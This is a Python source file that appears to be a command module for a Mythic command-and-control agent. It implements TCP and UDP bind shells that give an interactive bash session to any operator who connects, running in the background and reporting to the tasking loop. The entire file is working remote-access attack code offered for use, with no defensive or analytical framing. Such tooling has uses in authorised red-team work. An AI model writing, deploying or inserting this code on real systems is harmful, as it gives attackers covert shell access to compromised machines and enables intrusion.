import socket
import subprocess
import threading
import select
import json


# Binds a TCP socket on the given IP/port, accepts one inbound connection,
# then passes it directly as stdin/stdout/stderr to an interactive bash shell.
# SO_REUSEADDR allows the port to be reused quickly if the session dies.
def _tcp_bindshell(ip, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((ip, port))
    server.listen(1)
    conn, _ = server.accept()  # blocks until operator connects
    proc = subprocess.Popen(
        ["/bin/bash", "-i"],
        stdin=conn, stdout=conn, stderr=conn
    )
    proc.wait()
    conn.close()
    server.close()


# Binds a UDP socket on the given IP/port. Waits for the first packet from
# the operator to learn their address, then uses a sender thread to shuttle
# proc stdout back over UDP while the main loop reads incoming data into proc stdin.
def _udp_bindshell(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind((ip, port))
    data, addr = s.recvfrom(4096)  # first packet reveals the operator's address
    proc = subprocess.Popen(
        ["/bin/bash", "-i"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT
    )
    if data.strip():
        proc.stdin.write(data)
        proc.stdin.flush()

    def _send():
        while True:
            chunk = proc.stdout.read(1024)
            if not chunk:
                break
            s.sendto(chunk, addr)

    threading.Thread(target=_send, daemon=True).start()

    while proc.poll() is None:
        r, _, _ = select.select([s], [], [], 1.0)
        if r:
            data, _ = s.recvfrom(4096)
            proc.stdin.write(data)
            proc.stdin.flush()

    s.close()


# Starts the bind shell in a daemon thread so the Mythic tasking loop
# continues unblocked. Posts a confirmation immediately and returns None.
def execute(params, task_id, callback_id):
    import agent  # deferred to avoid circular import — agent.py imports this module
    try:
        parsed   = json.loads(params)
        ip       = parsed.get("ip", "0.0.0.0").strip()
        port     = int(parsed.get("port", 0))
        protocol = parsed.get("protocol", "TCP").upper()
    except Exception:
        agent.post_response(callback_id, task_id, "bindshell: invalid parameters")
        return None

    if not port:
        agent.post_response(callback_id, task_id, "bindshell: port is required")
        return None

    target = _tcp_bindshell if protocol == "TCP" else _udp_bindshell
    threading.Thread(target=target, args=(ip, port), daemon=True).start()
    agent.post_response(callback_id, task_id,
        f"bind shell listening on {ip}:{port} ({protocol})")
    return None  # always — this command manages all its own posts
